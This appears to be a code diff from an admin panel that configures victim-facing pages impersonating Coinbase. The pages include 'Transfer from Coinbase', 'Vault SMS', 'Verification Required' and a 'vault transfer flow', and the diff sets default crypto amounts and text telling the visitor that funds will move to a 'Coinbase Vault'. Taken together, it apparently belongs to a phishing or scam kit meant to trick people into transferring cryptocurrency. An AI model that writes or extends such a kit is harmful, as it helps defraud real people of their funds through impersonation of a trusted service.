@@ -1,6 +1,8 @@
 /**
  * Configurable visitor page variables — defaults and field schemas for the admin panel.
  */
+import { VISITOR_COIN_CATALOG } from '$lib/coinCatalog.js';
+
 export interface PageVarField {
 	key: string;
 	label: string;
@@ -15,42 +17,16 @@ export interface CoinPreset {
 	img: string;
 }
 
-export const COIN_PRESETS: Record<string, CoinPreset> = {
-	BTC: {
-		name: 'Bitcoin',
-		symbol: 'BTC',
-		img: '/_next/static/media/bitcoin.44da609b.png'
-	},
-	ETH: {
-		name: 'Ethereum',
-		symbol: 'ETH',
-		img: '/_next/static/media/ethereum.0a38a4d0.png'
-	},
-	USDT: {
-		name: 'Tether',
-		symbol: 'USDT',
-		img: '/_next/static/media/tether.84db185b.png'
-	},
-	SOL: {
-		name: 'Solana',
-		symbol: 'SOL',
-		img: '/_next/static/media/solana.0c81d69c.png'
-	},
-	XRP: {
-		name: 'XRP',
-		symbol: 'XRP',
-		img: '/_next/static/media/xrp.cebc03fb.png'
-	},
-	BNB: {
-		name: 'BNB',
-		symbol: 'BNB',
-		img: '/_next/static/media/bnb.b1d88c4b.png'
-	}
-};
+export const COIN_PRESETS: Record<string, CoinPreset> = Object.fromEntries(
+	VISITOR_COIN_CATALOG.map((c) => [
+		c.symbol,
+		{ name: c.name, symbol: c.symbol, img: c.img }
+	])
+);
 
-const COIN_OPTIONS = Object.entries(COIN_PRESETS).map(([value, c]) => ({
-	value,
-	label: `${c.name} (${value})`
+const COIN_OPTIONS = VISITOR_COIN_CATALOG.map((c) => ({
+	value: c.symbol,
+	label: `${c.name} (${c.symbol})`
 }));
 
 export const PAGE_VAR_SCHEMAS: Record<string, PageVarField[]> = {
@@ -81,8 +57,22 @@ export const PAGE_VAR_SCHEMAS: Record<string, PageVarField[]> = {
 	],
 	'Coinbase/Transfer from Coinbase': [
 		{ key: 'subtitle', label: 'Subtitle', type: 'text', placeholder: 'Move your crypto into your vault...' }
+	],
+	'Coinbase/Select Asset': [
+		{ key: 'coin', label: 'Default asset', type: 'select', options: COIN_OPTIONS },
+		{ key: 'amount', label: 'Amount', type: 'text', placeholder: '0.2' },
+		{ key: 'amountUsd', label: 'Amount (USD)', type: 'text', placeholder: '15636.29' }
 	]
 };
+
+/** Pages that share coin/amount from visitor.inputs across the vault transfer flow. */
+export const VAULT_TRANSFER_PAGES = new Set([
+	'Select Asset',
+	'Confirm Transfer',
+	'Vault SMS',
+	'Verification Required',
+	'Vault Dashboard'
+]);
 
 export const PAGE_VAR_DEFAULTS: Record<string, Record<string, string>> = {
 	'Coinbase/Transfer from Coinbase': {
@@ -112,6 +102,11 @@ export const PAGE_VAR_DEFAULTS: Record<string, Record<string, string>> = {
 		assetAmount: '0.0000',
 		assetLabel: 'test',
 		holdMinutes: '60'
+	},
+	'Coinbase/Select Asset': {
+		coin: 'BTC',
+		amount: '0.2',
+		amountUsd: '15636.29'
 	}
 };
 
@@ -161,6 +156,11 @@ export function resolveDisplayVars(raw: Record<string, string>): Record<string, 
 	out.transferButton = `Transfer ${preset.symbol}`;
 	out.verifyCoinPhrase = preset.symbol;
 	out.assetAmountDisplay = `${raw.assetAmount || '0.0000'} ${preset.symbol}`;
+	out.pendingStatus = raw.pendingStatus || 'Pending transfer';
+
+	const from = raw.from || 'Coinbase';
+	const to = raw.to || 'Coinbase Vault';
+	out.transferInfoLine = `${out.amountDisplay} will be transferred from ${from} to ${to}. Verification may be required.`;
 
 	return out;
 }
